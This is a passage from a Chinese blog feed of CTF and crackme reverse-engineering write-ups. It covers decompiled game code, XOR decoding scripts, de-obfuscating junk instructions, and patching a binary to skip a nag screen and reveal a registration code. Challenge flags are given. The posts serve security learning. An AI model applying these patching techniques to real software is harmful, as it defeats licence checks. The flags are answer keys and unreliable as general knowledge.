class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">1</span> <span class="keyword">using</span> System;</span><br><span class="line">  <span class="number">2</span> <span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line">  <span class="number">3</span> <span class="keyword">using</span> System.Text;</span><br><span class="line">  <span class="number">4</span> <span class="keyword">using</span> UnityEngine;</span><br><span class="line">  <span class="number">5</span> </span><br><span class="line">  <span class="number">6</span> <span class="comment">// Token: 0x02000004 RID: 4</span></span><br><span class="line">  <span class="number">7</span> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ButtonSpawnFruit</span> :</span> MonoBehaviour</span><br><span class="line">  <span class="number">8</span> &#123;</span><br><span class="line">  <span class="number">9</span>     <span class="comment">// Token: 0x0600000A RID: 10 RVA: 0x00002110 File Offset: 0x00000310</span></span><br><span class="line"> <span class="number">10</span>     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">Md5</span><span class="params">(<span class="built_in">string</span> str)</span></span></span><br><span class="line"><span class="function"> 11     </span>&#123;</span><br><span class="line"> <span class="number">12</span>         byte[] bytes = Encoding.UTF8.GetBytes(str);</span><br><span class="line"> <span class="number">13</span>         byte[] <span class="built_in">array</span> = MD5.Create().ComputeHash(bytes);</span><br><span class="line"> <span class="number">14</span>         StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"> <span class="number">15</span>         foreach (byte b in <span class="built_in">array</span>)</span><br><span class="line"> <span class="number">16</span>         &#123;</span><br><span class="line"> <span class="number">17</span>             stringBuilder.Append(b.ToString(<span class="string">&quot;X2&quot;</span>));</span><br><span class="line"> <span class="number">18</span>         &#125;</span><br><span class="line"> <span class="number">19</span>         <span class="keyword">return</span> stringBuilder.ToString().Substring(<span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line"> <span class="number">20</span>     &#125;</span><br><span class="line"> <span class="number">21</span> </span><br><span class="line"> <span class="number">22</span>     <span class="comment">// Token: 0x0600000B RID: 11 RVA: 0x00002170 File Offset: 0x00000370</span></span><br><span class="line"> <span class="number">23</span>     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">Sha1</span><span class="params">(<span class="built_in">string</span> str)</span></span></span><br><span class="line"><span class="function"> 24     </span>&#123;</span><br><span class="line"> <span class="number">25</span>         byte[] bytes = Encoding.UTF8.GetBytes(str);</span><br><span class="line"> <span class="number">26</span>         byte[] <span class="built_in">array</span> = SHA1.Create().ComputeHash(bytes);</span><br><span class="line"> <span class="number">27</span>         StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"> <span class="number">28</span>         foreach (byte b in <span class="built_in">array</span>)</span><br><span class="line"> <span class="number">29</span>         &#123;</span><br><span class="line"> <span class="number">30</span>             stringBuilder.Append(b.ToString(<span class="string">&quot;X2&quot;</span>));</span><br><span class="line"> <span class="number">31</span>         &#125;</span><br><span class="line"> <span class="number">32</span>         <span class="keyword">return</span> stringBuilder.ToString();</span><br><span class="line"> <span class="number">33</span>     &#125;</span><br><span class="line"> <span class="number">34</span> </span><br><span class="line"> <span class="number">35</span>     <span class="comment">// Token: 0x0600000C RID: 12 RVA: 0x000021C8 File Offset: 0x000003C8</span></span><br><span class="line"> <span class="number">36</span>     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Spawn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> 37     </span>&#123;</span><br><span class="line"> <span class="number">38</span>         FruitSpawner component = GameObject.FindWithTag(<span class="string">&quot;GameController&quot;</span>).GetComponent&lt;FruitSpawner&gt;();</span><br><span class="line"> <span class="number">39</span>         <span class="keyword">if</span> (component)</span><br><span class="line"> <span class="number">40</span>         &#123;</span><br><span class="line"> <span class="number">41</span>             <span class="keyword">if</span> (<span class="keyword">this</span>.audioSources.Length != <span class="number">0</span>)</span><br><span class="line"> <span class="number">42</span>             &#123;</span><br><span class="line"> <span class="number">43</span>                 <span class="keyword">this</span>.audioSources[Random.Range(<span class="number">0</span>, <span class="keyword">this</span>.audioSources.Length)].Play();</span><br><span class="line"> <span class="number">44</span>             &#125;</span><br><span class="line"> <span class="number">45</span>             component.Spawn(<span class="keyword">this</span>.toSpawn);</span><br><span class="line"> <span class="number">46</span>             <span class="built_in">string</span> name = <span class="keyword">this</span>.toSpawn.name;</span><br><span class="line"> <span class="number">47</span>             <span class="keyword">if</span> (name == <span class="string">&quot;汉堡底&quot;</span> &amp;&amp; Init.spawnCount == <span class="number">0</span>)</span><br><span class="line"> <span class="number">48</span>             &#123;</span><br><span class="line"> <span class="number">49</span>                 Init.secret += <span class="number">997</span>;</span><br><span class="line"> <span class="number">50</span>             &#125;</span><br><span class="line"> <span class="number">51</span>             <span class="keyword">else</span> <span class="keyword">if</span> (name == <span class="string">&quot;鸭屁股&quot;</span>)</span><br><span class="line"> <span class="number">52</span>             &#123;</span><br><span class="line"> <span class="number">53</span>                 Init.secret -= <span class="number">127</span>;</span><br><span class="line"> <span class="number">54</span>             &#125;</span><br><span class="line"> <span class="number">55</span>             <span class="keyword">else</span> <span class="keyword">if</span> (name == <span class="string">&quot;胡罗贝&quot;</span>)</span><br><span class="line"> <span class="number">56</span>             &#123;</span><br><span class="line"> <span class="number">57</span>                 Init.secret *= <span class="number">3</span>;</span><br><span class="line"> <span class="number">58</span>             &#125;</span><br><span class="line"> <span class="number">59</span>             <span class="keyword">else</span> <span class="keyword">if</span> (name == <span class="string">&quot;臭豆腐&quot;</span>)</span><br><span class="line"> <span class="number">60</span>             &#123;</span><br><span class="line"> <span class="number">61</span>                 Init.secret ^= <span class="number">18</span>;</span><br><span class="line"> <span class="number">62</span>             &#125;</span><br><span class="line"> <span class="number">63</span>             <span class="keyword">else</span> <span class="keyword">if</span> (name == <span class="string">&quot;俘虏&quot;</span>)</span><br><span class="line"> <span class="number">64</span>             &#123;</span><br><span class="line"> <span class="number">65</span>                 Init.secret += <span class="number">29</span>;</span><br><span class="line"> <span class="number">66</span>             &#125;</span><br><span class="line"> <span class="number">67</span>             <span class="keyword">else</span> <span class="keyword">if</span> (name == <span class="string">&quot;白拆&quot;</span>)</span><br><span class="line"> <span class="number">68</span>             &#123;</span><br><span class="line"> <span class="number">69</span>                 Init.secret -= <span class="number">47</span>;</span><br><span class="line"> <span class="number">70</span>             &#125;</span><br><span class="line"> <span class="number">71</span>             <span class="keyword">else</span> <span class="keyword">if</span> (name == <span class="string">&quot;美汁汁&quot;</span>)</span><br><span class="line"> <span class="number">72</span>             &#123;</span><br><span class="line"> <span class="number">73</span>                 Init.secret *= <span class="number">5</span>;</span><br><span class="line"> <span class="number">74</span>             &#125;</span><br><span class="line"> <span class="number">75</span>             <span class="keyword">else</span> <span class="keyword">if</span> (name == <span class="string">&quot;柠檬&quot;</span>)</span><br><span class="line"> <span class="number">76</span>             &#123;</span><br><span class="line"> <span class="number">77</span>                 Init.secret ^= <span class="number">87</span>;</span><br><span class="line"> <span class="number">78</span>             &#125;</span><br><span class="line"> <span class="number">79</span>             <span class="keyword">else</span> <span class="keyword">if</span> (name == <span class="string">&quot;汉堡顶&quot;</span> &amp;&amp; Init.spawnCount == <span class="number">5</span>)</span><br><span class="line"> <span class="number">80</span>             &#123;</span><br><span class="line"> <span class="number">81</span>                 Init.secret ^= <span class="number">127</span>;</span><br><span class="line"> <span class="number">82</span>                 <span class="built_in">string</span> str = Init.secret.ToString();</span><br><span class="line"> <span class="number">83</span>                 <span class="keyword">if</span> (ButtonSpawnFruit.Sha1(str) == <span class="string">&quot;DD01903921EA24941C26A48F2CEC24E0BB0E8CC7&quot;</span>)</span><br><span class="line"> <span class="number">84</span>                 &#123;</span><br><span class="line"> <span class="number">85</span>                     <span class="keyword">this</span>.result = <span class="string">&quot;BJDCTF&#123;&quot;</span> + ButtonSpawnFruit.Md5(str) + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"> <span class="number">86</span>                     Debug.Log(<span class="keyword">this</span>.result);</span><br><span class="line"> <span class="number">87</span>                 &#125;</span><br><span class="line"> <span class="number">88</span>             &#125;</span><br><span class="line"> <span class="number">89</span>             Init.spawnCount++;</span><br><span class="line"> <span class="number">90</span>             Debug.Log(Init.secret);</span><br><span class="line"> <span class="number">91</span>             Debug.Log(Init.spawnCount);</span><br><span class="line"> <span class="number">92</span>         &#125;</span><br><span class="line"> <span class="number">93</span>     &#125;</span><br><span class="line"> <span class="number">94</span> </span><br><span class="line"> <span class="number">95</span>     <span class="comment">// Token: 0x04000005 RID: 5</span></span><br><span class="line"> <span class="number">96</span>     <span class="keyword">public</span> GameObject toSpawn;</span><br><span class="line"> <span class="number">97</span> </span><br><span class="line"> <span class="number">98</span>     <span class="comment">// Token: 0x04000006 RID: 6</span></span><br><span class="line"> <span class="number">99</span>     <span class="keyword">public</span> <span class="keyword">int</span> spawnCount = <span class="number">1</span>;</span><br><span class="line"><span class="number">100</span> </span><br><span class="line"><span class="number">101</span>     <span class="comment">// Token: 0x04000007 RID: 7</span></span><br><span class="line"><span class="number">102</span>     <span class="keyword">public</span> AudioSource[] audioSources;</span><br><span class="line"><span class="number">103</span> </span><br><span class="line"><span class="number">104</span>     <span class="comment">// Token: 0x04000008 RID: 8</span></span><br><span class="line"><span class="number">105</span>     <span class="keyword">public</span> <span class="built_in">string</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="number">106</span> &#125;</span><br></pre></td></tr></table></figure><p>经过SHa1加密得到<strong>DD01903921EA24941C26A48F2CEC24E0BB0E8CC7</strong>，经过解密就可以知道str=1001</p><p>再用MD5加密就可以得到b8c37e33defde51cf91e1e03e51657da</p><p>19行代码只取了20位，最后就可以得出flag</p><h1 id="WUSTCTF2020-Cr0ssfun"><a href="#WUSTCTF2020-Cr0ssfun" class="headerlink" title="[WUSTCTF2020]Cr0ssfun"></a>[WUSTCTF2020]Cr0ssfun</h1><p>找到主函数</p><p><img src="/2021/08/01/BUU-reverse3/fun9.PNG" alt="fun9"></p><p>要想跳出循环就要判断check这个函数，点进去看看</p><p><img src="/2021/08/01/BUU-reverse3/fun8.PNG" alt="fun8"></p><p>都是简单的判断，直接可以得出</p><h1 id="FlareOn6-Overlong"><a href="#FlareOn6-Overlong" class="headerlink" title="[FlareOn6]Overlong"></a>[FlareOn6]Overlong</h1><p>ida打开，主函数</p><p><img src="/2021/08/01/BUU-reverse3/long3.PNG" alt="long3"></p><p>第六行的函数，unk_402008的28位给Text,后面再用MessageBoxA输出text,运行试试</p><p> <img src="/2021/08/01/BUU-reverse3/long5.PNG" alt="long5"></p><p>输出中没有看到flag,看看unk_402008的数据</p><p><img src="/2021/08/01/BUU-reverse3/long4.PNG" alt="long4"></p><p>发现不止28个，有175个数据，就是AF</p><p>用OD打开</p><p><img src="/2021/08/01/BUU-reverse3/long1.PNG" alt="long1"></p><p>将压入栈的1C改为AF即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BJDCTF2020-BJD-hamburger-competition&quot;&gt;&lt;a href=&quot;#BJDCTF2020-BJD-hamburger-competition&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]BJD hamb</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ReverseMe1</title>
    <link href="http://example.com/2021/07/27/ReverseMe1/"/>
    <id>http://example.com/2021/07/27/ReverseMe1/</id>
    <published>2021-07-27T04:02:07.000Z</published>
    <updated>2021-07-28T08:05:59.117Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析ReverseMe1"><a href="#分析ReverseMe1" class="headerlink" title="分析ReverseMe1"></a>分析ReverseMe1</h2><h2 id="一-运行"><a href="#一-运行" class="headerlink" title="一.运行"></a>一.运行</h2><p>打开程序，首先出现了一个Nag,都是废话没有什么用，点击确定，接下来是一个序列号的界面，要求我们输入Regcode。</p><p>两个目标：</p><p>1.删除消息框</p><p>2.寻找Regcode</p><p><img src="/2021/07/27/ReverseMe1/1.PNG" alt="1"></p><p><img src="/2021/07/27/ReverseMe1/2.PNG" alt="2"></p><h2 id="二-分析"><a href="#二-分析" class="headerlink" title="二.分析"></a>二.分析</h2><h3 id="1-去除消息框"><a href="#1-去除消息框" class="headerlink" title="1.去除消息框"></a>1.去除消息框</h3><p><img src="/2021/07/27/ReverseMe1/3.PNG" alt="3"></p><p>用OD打开，看一眼是非常熟悉的Visual Basic代码，猜一下，要调用消息框，要调用MtrcMsgBox函数，直接右键搜索函数</p><p><img src="/2021/07/27/ReverseMe1/4.PNG" alt="4"></p><p>找到调用函数的地方，发现一共有四处调用的地方，给他们下断点</p><p><img src="/2021/07/27/ReverseMe1/5.PNG" alt="5"></p><p>F9运行到第一个断点的地方，往上面再看看就可以看到Nag Screen的字眼，就是显示出来的消息框</p><p><img src="/2021/07/27/ReverseMe1/6.PNG" alt="6"></p><p>那我们要如何修改，才能让他不显示</p><p>本来想直接把call指令修改掉，都是栈内就乱了无法传回去</p><p>接着往上找找看看这段的首在哪里，找到了函数的开头，直接把他改成retn 0x4直接返回,不执行接下来的内容</p><p><img src="/2021/07/27/ReverseMe1/7.PNG" alt="7"></p><h3 id="2-寻找Regcode"><a href="#2-寻找Regcode" class="headerlink" title="2.寻找Regcode"></a>2.寻找Regcode</h3><p><img src="/2021/07/27/ReverseMe1/8.PNG" alt="8"></p><p>先随便输入一个看看是什么结果，看到是Sorry！、、、、通过这个字符串去寻找函数</p><p><img src="/2021/07/27/ReverseMe1/9.PNG" alt="9"></p><p><img src="/2021/07/27/ReverseMe1/10.PNG" alt="10"></p><p>这里就看到了一个I’mlena151，push到栈中，接下来调用了vbaStrCmp的函数，字面上就可以看出来这是一个比较的函数</p><p><img src="/2021/07/27/ReverseMe1/11.PNG" alt="11"></p><p>所以这就是我们要寻找的</p><p><img src="/2021/07/27/ReverseMe1/12.PNG" alt="12"></p><p>成功！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;分析ReverseMe1&quot;&gt;&lt;a href=&quot;#分析ReverseMe1&quot; class=&quot;headerlink&quot; title=&quot;分析ReverseMe1&quot;&gt;&lt;/a&gt;分析ReverseMe1&lt;/h2&gt;&lt;h2 id=&quot;一-运行&quot;&gt;&lt;a href=&quot;#一-运行&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>BUU-reverse2</title>
    <link href="http://example.com/2021/07/25/BUU-reverse2/"/>
    <id>http://example.com/2021/07/25/BUU-reverse2/</id>
    <published>2021-07-25T02:13:49.000Z</published>
    <updated>2021-07-25T02:32:51.602Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HDCTF2019-Maze"><a href="#HDCTF2019-Maze" class="headerlink" title="[HDCTF2019]Maze"></a>[HDCTF2019]Maze</h1><p>拖入ida后发现打不开，可能是加壳了，脱壳，成功打开。</p><p>找到main函数</p><p><img src="/2021/07/25/BUU-reverse2/%E8%8A%B1%E6%8C%87%E4%BB%A43.PNG" alt="花指令3"></p><p>发现没有办法反汇编，这里最后的应该jnz跳转到下面一行，就是个没有用的指令，下面一个的call明显出错了，没有这个地址，可以推断出这段代码添加了花指令，IDA分析失败了。D键转换成字节数据查看</p><p><img src="/2021/07/25/BUU-reverse2/%E8%8A%B1%E6%8C%87%E4%BB%A44.PNG" alt="花指令4"></p><p>发现 <code>db 0E8h</code>这条指令是添加的花指令，将其nop掉,接下来打开OD,找到要修改的地方</p><p><img src="/2021/07/25/BUU-reverse2/%E8%8A%B1%E6%8C%87%E4%BB%A41.PNG" alt="花指令1"></p><p>将JNZ和下面的db E8都改成NOP保存为新的程序，再打开IDA</p><p><img src="/2021/07/25/BUU-reverse2/%E8%8A%B1%E6%8C%87%E4%BB%A45.PNG" alt="花指令5"></p><p>可以看出这是一个迷宫题，找到存放迷宫图的地方</p><p><img src="/2021/07/25/BUU-reverse2/%E8%8A%B16.PNG" alt="花6"></p><p><img src="/2021/07/25/BUU-reverse2/%E8%8A%B17.PNG" alt="花7"><br> 用wasd控制行走，dword_408078控制左右，dword_40807C控制上下。<br> s是上，w是下，a是右，d是左。<br> 行走路径为ssaaasaassdddw<br> 则flag为<code>flag&#123;ssaaasaassdddw&#125;</code></p><h1 id="MRCTF2020-Xor"><a href="#MRCTF2020-Xor" class="headerlink" title="[MRCTF2020]Xor"></a>[MRCTF2020]Xor</h1><p>用IDA打开，发现不能反汇编，不知道是什么原因</p><p>看汇编的流程图</p><p><img src="/2021/07/25/BUU-reverse2/1.PNG" alt="1"></p><p>先看到第一个<strong>call sub_401050</strong>，这里压入了一个<strong>byte_4212C0</strong>和一个**%s<strong>，说明输入的flag最终会存放到</strong>byte_4212C0<strong>，继续往下看到</strong>loc_4010B6**这个段，关注edx，edx不断的在自增，最后出循环之后，与1Bh进行比较，大概就可以猜测edx存放的就是输入的flag的长度。<br><img src="/2021/07/25/BUU-reverse2/2.PNG" alt="2"></p><p>如果最后<strong>edx</strong>的值大于<strong>0x1b</strong>，流程就会往右走，直接提示Wrong！再看左边</p><p><img src="/2021/07/25/BUU-reverse2/3.PNG" alt="3"></p><p>将<strong>byte_4212c0</strong>的数据给了cl,把cl与al异或，再与<strong>byte_41EA08</strong>比较，不相等则输出错误，EAX再+1，eax再与edx比较大小，dx可以看到是存储的flag的长度，小于则继续循环</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">text=<span class="string">&#x27;MSAWB~FXZ:J:`tQJ&quot;N@ bpdd&#125;8g&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">flag+=<span class="built_in">chr</span>(i^<span class="built_in">ord</span>(text[i]))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HDCTF2019-Maze&quot;&gt;&lt;a href=&quot;#HDCTF2019-Maze&quot; class=&quot;headerlink&quot; title=&quot;[HDCTF2019]Maze&quot;&gt;&lt;/a&gt;[HDCTF2019]Maze&lt;/h1&gt;&lt;p&gt;拖入ida后发现打不开，可能是加壳了，脱</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>分析abexcrackme2</title>
    <link href="http://example.com/2021/07/20/crackme2/"/>
    <id>http://example.com/2021/07/20/crackme2/</id>
    <published>2021-07-20T08:11:37.000Z</published>
    <updated>2021-07-22T12:17:57.245Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-abex‘crackme2"><a href="#1-abex‘crackme2" class="headerlink" title="1.abex‘crackme2"></a>1.abex‘crackme2</h1><h1 id="一-abex‘crackme2"><a href="#一-abex‘crackme2" class="headerlink" title="一.abex‘crackme2"></a>一.abex‘crackme2</h1><p>打开程序</p><p><img src="/2021/07/20/crackme2/1.PNG" alt="1"></p><p>要求我们输入名字与Serial，先随便输一个试试,点击check按钮，弹出了一个Wrong serial!的窗口，开始调试。</p><p><img src="/2021/07/20/crackme2/2.PNG" alt="2"></p><h1 id="二-VB专用引擎"><a href="#二-VB专用引擎" class="headerlink" title="二.VB专用引擎"></a>二.VB专用引擎</h1><p>VB文件使用名为MSVBVM60.dll ( Microsoft Visual Basic Virtual Machine 6.0 )的VB专用引擎(也称为The Thunder Runtime Engine )。<br>举个使用VB引擎的例子，显示消息框时，VB代码中要调用MsgBox)函数。其实，VB编辑器真正调用的是MSVBVM60.dll里的rtcMsgBox()函数，在该函数内部通过调用user32.dll里的MessageBoxW()函数(Win32 API）来工作（也可以在VB代码中直接调用user32.dll里的MessageBoxWO).</p><h1 id="三-开始调试"><a href="#三-开始调试" class="headerlink" title="三.开始调试"></a>三.开始调试</h1><p>运行OllyDbg,查看反汇编代码。</p><p><img src="/2021/07/20/crackme2/3.PNG" alt="3"></p><p>执行程序后，在EP代码中首先要做的是调用VB引擎的主函数（ThunRTMain() )。<br>EP的地址为401238。401238地址处的PUSH 401E14命令用来把RT_MainStruct结构体的地址( 401E14)压入栈。然后40123D地址处的CALL 00401232命令调用401232地址处的JMP DWORDPTR DS:[4010A0]指令。该JMP指令会跳转至VB引擎的主函数ThunRTMain()（前面压入栈的401E14的值作为ThunRTMain()的参数)。</p><h2 id="1-检索字符串"><a href="#1-检索字符串" class="headerlink" title="1.检索字符串"></a>1.检索字符串</h2><p><img src="/2021/07/20/crackme2/5.PNG" alt="5"></p><p>消息框的标题(“Wrong serial!”)、内容(“Nope，this serial is wrong!”)，还有实际调用消息框函数的代码(4034A6)都显示出来了。<br>从编程的观点来看，使用某种算法生成序列号，通过比较用户输入的序列号与字符串，代码分为TRUE(序列号相同）与FALSE(序列号不同)两大部分。换言之，上述代码的前后存在字符串比较代码,且序列号正确时程序代码会调用消息框输出成功消息.</p><p><img src="/2021/07/20/crackme2/6.PNG" alt="6"></p><p>调用403329地址的_vbaVarTstEq()函数，比较(TEST命令）返回值(AX)后，由403332地址的条件转移指令（JE指令）决定执行“真”代码还是“假”代码。</p><h2 id="2-查找字符串地址"><a href="#2-查找字符串地址" class="headerlink" title="2.查找字符串地址"></a>2.查找字符串地址</h2><p>调至403329处</p><p><img src="/2021/07/20/crackme2/7.PNG" alt="7"></p><p>有两个push，这时候我们查看栈窗口</p><p><img src="/2021/07/20/crackme2/8.PNG" alt="8"></p><p>可以看到地址0019F298，0019F288这两处。右键数据段查找</p><p><img src="/2021/07/20/crackme2/9.PNG" alt="9"></p><p>CCD8CAC8应该就是加密过的名字，sssss就是我们输入的serial，我们再用CCD8CAC8作为serial输入</p><p><img src="/2021/07/20/crackme2/11.PNG" alt="11"></p><h2 id="3-生成Serial的算法"><a href="#3-生成Serial的算法" class="headerlink" title="3.生成Serial的算法"></a>3.生成Serial的算法</h2><p>很显然,条件转移代码属于某个函数。该函数可能就是Check按钮的事件处理程序。原因在于选择Check按钮后，该函数会被调用执行，且含有用户代码来弹出成功/失败消息框。<br>最好倒着向上一点点地查找函数开始部分。向上拖动滚动条即可见到图8-14所示的代码。仔细看一下00402EDO地址处的命令。</p><p><img src="/2021/07/20/crackme2/12.PNG" alt="12"></p><p>上述代码是典型的栈帧代码，开始执行函数就会形成栈帧。由此得知该位置就是函数开始部分，即Check按钮的事件处理程序。</p><p>我们预测到程序使用VB引擎的API获取用户输入的字符串，下面以CALL指令为主进行调试(请注意观察此时传递给API的参数及返回值)。开始调试后，遇到第四条CALL指令，如下所示。</p><p><img src="/2021/07/20/crackme2/13.PNG" alt="13"></p><p>查看00402F8E地址处的代码可以看到，函数的局部对象SS:[EBP-88]地址传递(PUSH)给了函数的参数。</p><h3 id="加密方法"><a href="#加密方法" class="headerlink" title="加密方法"></a>加密方法</h3><p>(1)从给定的Name字符串前端逐一读取字符（共4次)。</p><p>(2)将字符转换为数字(ASCII代码)。</p><p>(3)向变换后的数字加64。</p><p>(4)再次将数字转换为字符。</p><p>(5)连接变换后的字符。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-abex‘crackme2&quot;&gt;&lt;a href=&quot;#1-abex‘crackme2&quot; class=&quot;headerlink&quot; title=&quot;1.abex‘crackme2&quot;&gt;&lt;/a&gt;1.abex‘crackme2&lt;/h1&gt;&lt;h1 id=&quot;一-abex‘crackm</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>BUU-reverse</title>
    <link href="http://example.com/2021/07/18/BUU-reverse/"/>
    <id>http://example.com/2021/07/18/BUU-reverse/</id>
    <published>2021-07-18T11:42:36.000Z</published>
    <updated>2021-07-18T13:02:43.916Z</updated>
    
    <content type="html"><![CDATA[<h1 id="【2019红帽杯】easyRE"><a href="#【2019红帽杯】easyRE" class="headerlink" title="【2019红帽杯】easyRE"></a>【2019红帽杯】easyRE</h1><p>直接IDA打开，搜索字符串找到一个you found me,进入sub_4009C6函数，先看到一个加密</p><p><img src="/2021/07/18/BUU-reverse/22.PNG" alt="22"></p><p>每个字符与索引异或判断是否相等，可以写一个脚本跑一下，结果发现不是，骗人的</p><p>运行结果：Info:The first four chars are ‘flag’</p><p>接着往下面看</p><p><img src="/2021/07/18/BUU-reverse/24.PNG" alt="24"></p><p><img src="/2021/07/18/BUU-reverse/23.PNG" alt="23"></p><p>发现是base64加密10次，判断是否与off_6cc90相等，base64解密十次得到了<a href="https://bbs.pediy.com/thread-254172.htm%EF%BC%8C%E6%B2%A1%E6%9C%89flag%EF%BC%8C%E9%83%BD%E6%98%AF%E6%B7%B7%E6%B7%86%E8%A7%86%E5%90%AC%E7%9A%84%EF%BC%8C%E7%9C%9F%E6%AD%A3%E7%9A%84%E8%97%8F%E5%9C%A8off_6cc90%E4%B8%8B%E9%9D%A2%E7%9A%84%E9%82%A3%E4%B8%AA%E6%95%B0%E6%8D%AE%E7%9A%84%E5%87%BD%E6%95%B0">https://bbs.pediy.com/thread-254172.htm，没有flag，都是混淆视听的，真正的藏在off_6cc90下面的那个数据的函数</a></p><p><img src="/2021/07/18/BUU-reverse/25.PNG" alt="25"><img src="/2021/07/18/BUU-reverse/26.PNG" alt="26"></p><p>首先用第20行的异或，102和103对应的字符分别是”f” 和”g”，而且byte_ <em>6CC0A0[0]和byte</em> _6CC0A3刚好<br>是一个字符串的第一位和第四位。那么可以想到是”flag” 与前四位异或，然后得到一个key,再进行下面for循<br>环的异或。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0x40</span>,<span class="number">0x35</span>,<span class="number">0x20</span>,<span class="number">0x56</span>,<span class="number">0x5D</span>,<span class="number">0x18</span>,<span class="number">0x22</span>,<span class="number">0x45</span>,<span class="number">0x17</span>,<span class="number">0x2F</span>,<span class="number">0x24</span>,<span class="number">0x6E</span>,<span class="number">0x62</span>,</span><br><span class="line">     <span class="number">0x3C</span>,<span class="number">0x27</span>,<span class="number">0x54</span>,<span class="number">0x48</span>,<span class="number">0x6C</span>,<span class="number">0x24</span>,<span class="number">0x6E</span>,<span class="number">0x72</span>,<span class="number">0x3C</span>,<span class="number">0x32</span>,<span class="number">0x45</span>,<span class="number">0x5B</span>]</span><br><span class="line">s1 = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    key += <span class="built_in">chr</span>(s[k] ^ <span class="built_in">ord</span>(s1[k]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(s[i] ^ <span class="built_in">ord</span>(key[i%<span class="number">4</span>]))</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="ACTF新生赛2020-rome"><a href="#ACTF新生赛2020-rome" class="headerlink" title="[ACTF新生赛2020]rome"></a>[ACTF新生赛2020]rome</h1><p>拖进IDA，查看main函数</p><p><img src="/2021/07/18/BUU-reverse/actf1.PNG" alt="actf1"></p><p><img src="/2021/07/18/BUU-reverse/actf2.PNG" alt="actf2"></p><p>先判断了前面几位，再判断是不是大小写，然后运算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="number">81</span>,<span class="number">115</span>,<span class="number">119</span>,<span class="number">51</span>,<span class="number">115</span>,<span class="number">106</span>,<span class="number">95</span>,<span class="number">108</span>,<span class="number">122</span>,<span class="number">52</span>,<span class="number">95</span>,<span class="number">85</span>,<span class="number">106</span>,<span class="number">119</span>,<span class="number">64</span>,<span class="number">108</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):  </span><br><span class="line">        z = i</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">64</span> <span class="keyword">and</span> i &lt;= <span class="number">90</span>:</span><br><span class="line">            i = (i-<span 